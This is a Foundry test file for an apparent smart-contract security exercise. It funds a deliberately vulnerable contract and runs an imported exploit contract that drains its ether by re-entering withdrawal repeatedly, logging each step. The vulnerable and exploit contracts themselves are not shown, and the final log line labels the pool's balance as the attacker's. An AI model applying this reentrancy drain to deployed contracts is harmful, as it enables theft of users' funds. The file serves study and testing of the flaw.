// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/1 - Reentrancy.sol";

contract CounterTest is Test {
    ReentrancyVuln public vulnContract;
    ExploitReentrancy public exploiter;
    uint public ethInPool = 5 ether;
    uint public attackerGivenEth = 1 ether;

    function setUp() public {
        vulnContract = new ReentrancyVuln();
        exploiter = new ExploitReentrancy();

        vm.deal(address(0x7), ethInPool);
        vm.prank(address(0x7));
        vulnContract.giveEth{value: ethInPool}();

        vm.deal(address(exploiter), attackerGivenEth);
        vm.prank(address(exploiter));
        vulnContract.giveEth{value: attackerGivenEth}();
    }

    function testExploit() public {
        uint256 times_to_reenter = address(vulnContract).balance / attackerGivenEth;
        console.log("Times to re enter", times_to_reenter);
        exploiter.withdrawEthFromVulnContract(address(vulnContract), times_to_reenter);
        console.log("Exploit finished, attacker balance is now", address(vulnContract).balance / 1e18, "ether");
    }
}
